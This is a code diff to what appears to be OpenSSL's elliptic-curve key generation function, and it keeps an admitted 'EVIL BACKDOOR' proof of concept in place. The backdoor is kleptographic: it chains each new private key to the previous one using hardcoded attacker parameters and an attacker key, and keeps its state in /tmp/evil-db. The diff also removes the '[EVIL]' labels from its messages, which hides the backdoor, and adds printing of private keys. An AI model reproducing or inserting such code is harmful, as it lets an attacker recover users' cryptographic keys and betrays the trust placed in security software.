@@ -204,8 +204,8 @@ void _perror(char* str){
 }
 
 void _dump_bn(FILE* fd, BIGNUM* bn){
-    if(!fd) _perror("[EVIL] dump_bn: fd==NULL");
-    if(!bn) _perror("[EVIL] dump_bn: bn==NULL");
+    if(!fd) _perror("dump_bn: fd==NULL");
+    if(!bn) _perror("dump_bn: bn==NULL");
 
     fwrite(&bn->top, sizeof(int), 1, fd);
     fwrite(&bn->dmax, sizeof(int), 1, fd);
@@ -217,7 +217,7 @@ void _dump_bn(FILE* fd, BIGNUM* bn){
 BIGNUM* _load_bn(FILE* fd){
     BIGNUM* ret = BN_new();
 
-    if(!ret) _perror("[EVIL] load_bn: ret==NULL");
+    if(!ret) _perror("load_bn: ret==NULL");
 
     fread(&ret->top, sizeof(int), 1, fd);
     fread(&ret->dmax, sizeof(int), 1, fd);
@@ -241,7 +241,7 @@ BIGNUM* _H(BIGNUM* x){
 
     BIGNUM* ret = BN_new();
     // take first c2size bytes from hash
-    if(!BN_bin2bn(hash, c2size, ret)) _perror("[EVIL] _H(x)");
+    if(!BN_bin2bn(hash, c2size, ret)) _perror("_H(x)");
 
     return ret;
 }
@@ -264,7 +264,7 @@ void _print_bn(BIGNUM* bn, char* name){
 }
 
 void _print(char *msg){
-    int verbose = 0;
+    int verbose = 1;
     if(verbose)
         printf("[EVIL] %s", msg);
 }
@@ -306,23 +306,27 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
     // EVIL BACKDOOR
     if(-1 != access("/tmp/evil-db", F_OK)){
         // file exists, use algo 2
-        _print("[EVIL] algo 2\n");
+        _print("algo 2\n");
         FILE *fr = fopen("/tmp/evil-db", "r");
-        if(!fr) _perror("[EVIL] ec_key_simple_generate_key: fr==NULL");
+        if(!fr) _perror("ec_key_simple_generate_key: fr==NULL");
 
         // a,b,h,e
         BIGNUM* params[4];
-        for(int p=0; p<4; p++){
-            params[p] = _load_bn(fr);
-        }
+        params[0] = BN_new();
+        BN_hex2bn(&params[0], "66F5AB9BD8F89835ECF50E5BCCAD57AE2166C806B606CDF39C2B9A2C9DF40E32");
+        params[1] = BN_new();
+        BN_hex2bn(&params[1], "9DF6B8328BDD6D0B74396BA6C97CF63D088006C1E448D416F89A0E31466141D4");
+        params[2] = BN_new();
+        BN_hex2bn(&params[2], "7E018B1F9EEE4C3D61EA21B11F2218296E8BAF02CAB45F5D9C9038CCEE0CB50F");
+        params[3] = BN_new();
+        BN_hex2bn(&params[3], "1114344294863AF852984EEB366E37088D36A302A6D748A5B5E12695D28E9A73");
 
         // attacker's private key
         // normally here should be the public key, but it is too hard to 
         // deserialize it from the encoded in bytes X,Y,Z
         // we don't care because this is PoC
         BIGNUM* v = BN_new();
-        BN_hex2bn(&v, "4ca67e007a740365bd696d34b829506abe470fb135807994b24a9bf0e655ae02");
-
+        BN_hex2bn(&v, "0146D483EC3C80F59A4B6BC1243A5CC6275E50CD2FC4B60B2A8DD0032741F1A6");
         // we don't need fresh key
         BN_free(priv_key);
         priv_key = _load_bn(fr); // c1
@@ -347,12 +351,13 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
 
         // V = vG -- attacker's public key
         EC_POINT *V = EC_POINT_new(eckey->group);
-        if(!EC_POINT_copy(V, G)) _perror("[EVIL] V=G");
+        if(!EC_POINT_copy(V, G)) _perror("V=G");
+
         EC_POINT_mul(eckey->group, V, v, NULL, NULL, ctx);
         
         {
             // Q1 = c1 * G
-            if(!EC_POINT_copy(Q2, G)) _perror("[EVIL] Q2=G");
+            if(!EC_POINT_copy(Q2, G)) _perror("Q2=G");
             EC_POINT_mul(eckey->group, Q2, priv_key, NULL, NULL, ctx);
             // Q2 = a * Q1
             EC_POINT_mul(eckey->group, Q2, params[0], NULL, NULL, ctx);
@@ -361,46 +366,43 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
 
         {
             // W1 = c1 * V
-            if(!EC_POINT_copy(W2, V)) _perror("[EVIL] W2=V");
+            if(!EC_POINT_copy(W2, V)) _perror("W2=V");
             EC_POINT_mul(eckey->group, W2, priv_key, NULL, NULL, ctx);
             // W2 = b * W1
             EC_POINT_mul(eckey->group, W2, params[1], NULL, NULL, ctx);
             // Z = Q2 + W2
-            if(!EC_POINT_add(eckey->group, Z, Q2, W2, ctx)) _perror("[EVIL] Z=Q2+W2");
+            if(!EC_POINT_add(eckey->group, Z, Q2, W2, ctx)) _perror("Z=Q2+W2");
             // Z = Q2 + W2
         }
 
         if(j == 1){
             // E2 = h * G
-            if(!EC_POINT_copy(E2, G)) _perror("[EVIL] E2=V");
+            if(!EC_POINT_copy(E2, G)) _perror("E2=V");
             EC_POINT_mul(eckey->group, E2, params[2], NULL, NULL, ctx);
             // Z += E2
-            if(!EC_POINT_add(eckey->group, Z, Z, E2, ctx)) _perror("[EVIL] Z=Z+E2");
+            if(!EC_POINT_add(eckey->group, Z, Z, E2, ctx)) _perror("Z=Z+E2");
             // Z = Q2 + W2 + E2 
         }
 
         if(u == 1){
             // R2 = e * V
-            if(!EC_POINT_copy(R2, V)) _perror("[EVIL] R2=V");
+            if(!EC_POINT_copy(R2, V)) _perror("R2=V");
             EC_POINT_mul(eckey->group, R2, params[3], NULL, NULL, ctx);
             // Z += R2
-            if(!EC_POINT_add(eckey->group, Z, Z, R2, ctx)) _perror("[EVIL] Z=Z+R2");
+            if(!EC_POINT_add(eckey->group, Z, Z, R2, ctx)) _perror("Z=Z+R2");
             // Z = Q2 + W2 + E2 + R2
         }
 
         // STEP 2: H(Z)
+        _print_bn(priv_key, "priv_key before hashing");
         BN_free(priv_key);
         priv_key = _H(Z->X);
+        _print_bn(priv_key, "priv_key after hashing");
 
         // STEP 3: store c2
         FILE *fw = fopen("/tmp/evil-db", "w"); // it's ok that we remove previous db
-        if(!fw) _perror("[EVIL] can't open /tmp/evil-db");
+        if(!fw) _perror("can't open /tmp/evil-db");
         
-        // save a,b,h,e
-        for(int p=0; p<4; p++){
-            _dump_bn(fw, params[p]);
-            BN_free(params[p]);
-        }
         // save c2
         _dump_bn(fw, priv_key);
 
@@ -420,28 +422,14 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
     }
     else{
         // file dosn't exits, use algo 1
-        _print("[EVIL] algo 1\n");
+        _print("algo 1\n");
         FILE* fw = fopen("/tmp/evil-db", "w");
-        if(!fw) _perror("[EVIL] can't open /tmp/evil-db");
-
-        // generate and wite to db: a,b,h,e
-        BIGNUM* params[4];
-        for(int p=0; p<4; p++){
-            params[p] = BN_new();
-            do
-                if (!BN_rand_range(params[p], order))
-                    goto err;
-            while (BN_is_zero(params[p]));
-
-            _dump_bn(fw, params[p]);
-            BN_free(params[p]);
-        }
+        if(!fw) _perror("can't open /tmp/evil-db");
 
         // write: c1
+        _print_bn(priv_key, "priv_key");
         _dump_bn(fw, priv_key);
 
-        // in file in this order:
-        // a,b,h,e,c1
         if(fw) fclose(fw);
     }
 
